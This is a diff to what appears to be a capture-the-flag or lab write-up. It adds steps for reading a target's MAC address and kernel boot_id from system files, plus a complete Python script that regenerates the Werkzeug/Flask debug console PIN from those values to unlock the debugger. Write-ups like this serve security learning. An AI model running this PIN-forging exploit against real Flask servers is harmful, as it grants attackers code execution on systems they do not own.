@@ -103,4 +103,63 @@ export TERM=xterm-256color
 >[!example]- Result
 >![[Pasted image 20250226164003.png]]
 
-- now we have all pieces to reproduce a PIN code to get access at debug console
+- now we have all pieces to reproduce a PIN code to get access at debug console, first we need to get MAC address (In my case `2485377892359`)
+```bash
+cat /sys/class/net/eth0/address
+python -c 'print(0x0242ac110007)'
+```
+>[!example]- Result
+>![[Pasted image 20250226172041.png]]
+
+- And get this value `/proc/sys/kernel/random/boot_i` in my case `e9630489-23dd-47bb-b05d-3250757832dc` 
+```bash
+cat /proc/sys/kernel/random/boot_id
+```
+>[!example]- Result
+>![[Pasted image 20250226172348.png]]
+
+- so the final code:
+```python
+import hashlib
+from itertools import chain
+probably_public_bits = [
+	'root',# username
+	'flask.app',# modname
+	'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
+	'/usr/local/lib/python3.10/site-packages/flask/app.py' # getattr(mod, '__file__', None),
+]
+
+private_bits = [
+	'2485377892359',# str(uuid.getnode()),  /sys/class/net/ens33/address
+	'e963048923dd47bbb05d3250757832dc'# get_machine_id(), /etc/machine-id
+]
+
+h = hashlib.md5()
+for bit in chain(probably_public_bits, private_bits):
+	if not bit:
+		continue
+	if isinstance(bit, str):
+		bit = bit.encode('utf-8')
+	h.update(bit)
+h.update(b'cookiesalt')
+#h.update(b'shittysalt')
+
+cookie_name = '__wzd' + h.hexdigest()[:20]
+
+num = None
+if num is None:
+	h.update(b'pinsalt')
+	num = ('%09d' % int(h.hexdigest(), 16))[:9]
+
+rv =None
+if rv is None:
+	for group_size in 5, 4, 3:
+		if len(num) % group_size == 0:
+			rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
+						  for x in range(0, len(num), group_size))
+			break
+	else:
+		rv = num
+
+print(rv)
+```
